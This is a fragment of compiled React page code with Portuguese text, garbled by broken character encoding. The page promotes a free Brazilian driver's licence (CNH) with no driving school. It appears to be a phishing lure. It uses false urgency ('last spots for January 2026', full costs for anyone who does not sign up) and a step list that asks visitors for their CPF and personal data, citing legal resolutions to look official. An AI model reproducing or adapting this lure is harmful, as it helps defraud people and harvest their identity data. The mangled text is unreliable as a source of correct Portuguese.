            children: ["Devido ┴á alta demanda, restam poucas vagas para obter a CNH gratuitamente e sem autoescola. Estas sÒo as ·ltimas vagas disponÝveis para ", l.jsx("strong", {
              style: {
                color: "#333333"
              },
              children: "janeiro de 2026"
            }), ". Caso nÒo realize a inscriþÒo com urgÛncia, a pr¾xima oportunidade serß somente entre 2026 e 2027. Quem nÒo se cadastrar arcarß com os custos integrais do processo de habilitaþÒo."]
          })]
        }), l.jsx("div", {
          ...
          children: "O processo de inscriþÒo Ú simples e pode ser feito totalmente online:"
        }), l.jsxs("ol", {
          ...
          children: [l.jsx("li", {
            children: "Clique no botÒo abaixo para iniciar seu cadastro"
          }), l.jsx("li", {
            children: "Informe seu CPF para verificar elegibilidade"
          }), l.jsx("li", {
            children: "Confirme seus dados pessoais"
          }), l.jsx("li", {
            children: "Sua Carteira de Motorista serß emitida em atÚ 20 dias"
          })]
        }), l.jsxs("div", {
          className: "text-center my-8",
          children: [l.jsx("button", {
          ...
          children: [l.jsx("h2", {
            ...
            children: [l.jsx("li", {
              children: "ResoluþÒo Contran n║ 985/2025"
            }), l.jsx("li", {
              children: "Lei n║ 14.071/2020 (Nova Lei de TrÔnsito)"
            }), l.jsx("li", {
